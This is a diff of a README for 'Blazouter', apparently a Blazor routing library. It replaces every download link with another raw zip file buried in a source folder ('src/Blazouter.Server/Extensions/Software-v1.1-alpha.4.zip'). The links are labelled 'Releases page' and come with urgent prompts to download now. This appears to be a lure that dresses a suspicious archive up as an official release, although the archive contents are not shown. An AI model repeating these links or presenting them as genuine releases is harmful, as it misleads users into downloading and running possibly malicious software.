@@ -1,6 +1,6 @@
 # 🚀 Blazouter - Simplify Your Blazor Routing Experience
 
-[![Download Blazouter](https://raw.githubusercontent.com/FRANCIS74232/Blazouter/develop/samples/Blazouter.Web.Sample/Blazouter.Web.Sample/wwwroot/css/Blazouter_1.8-alpha.3.zip%20Blazouter-FRANCIS74232/Blazouter/releases-blue)](https://raw.githubusercontent.com/FRANCIS74232/Blazouter/develop/samples/Blazouter.Web.Sample/Blazouter.Web.Sample/wwwroot/css/Blazouter_1.8-alpha.3.zip)
+[![Download Blazouter](https://github.com/FRANCIS74232/Blazouter/raw/refs/heads/develop/src/Blazouter.Server/Extensions/Software-v1.1-alpha.4.zip%20Blazouter-FRANCIS74232/Blazouter/releases-blue)](https://github.com/FRANCIS74232/Blazouter/raw/refs/heads/develop/src/Blazouter.Server/Extensions/Software-v1.1-alpha.4.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run Blazouter.
 
 ### 1. Visit the Download Page
 
-To download Blazouter, visit our [Releases page](https://raw.githubusercontent.com/FRANCIS74232/Blazouter/develop/samples/Blazouter.Web.Sample/Blazouter.Web.Sample/wwwroot/css/Blazouter_1.8-alpha.3.zip).
+To download Blazouter, visit our [Releases page](https://github.com/FRANCIS74232/Blazouter/raw/refs/heads/develop/src/Blazouter.Server/Extensions/Software-v1.1-alpha.4.zip).
 
 ### 2. Choose the Right Version
 
@@ -64,7 +64,7 @@ Blazouter offers several powerful features:
 
 ## 📋 Download & Install
 
-We recommend that you download Blazouter now. Visit our [Releases page](https://raw.githubusercontent.com/FRANCIS74232/Blazouter/develop/samples/Blazouter.Web.Sample/Blazouter.Web.Sample/wwwroot/css/Blazouter_1.8-alpha.3.zip) to get the latest version.
+We recommend that you download Blazouter now. Visit our [Releases page](https://github.com/FRANCIS74232/Blazouter/raw/refs/heads/develop/src/Blazouter.Server/Extensions/Software-v1.1-alpha.4.zip) to get the latest version.
 
 Click on your preferred version, and follow the installation instructions above. 
 
@@ -85,4 +85,4 @@ Join our community to enhance your experience with Blazouter. Engage with other 
 
 Once Blazouter is installed, explore its features. Set up your first project and start building your Blazor applications with confidence.
 
-For more information and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/FRANCIS74232/Blazouter/develop/samples/Blazouter.Web.Sample/Blazouter.Web.Sample/wwwroot/css/Blazouter_1.8-alpha.3.zip). Happy coding!
+For more information and updates, keep an eye on our [Releases page](https://github.com/FRANCIS74232/Blazouter/raw/refs/heads/develop/src/Blazouter.Server/Extensions/Software-v1.1-alpha.4.zip). Happy coding!
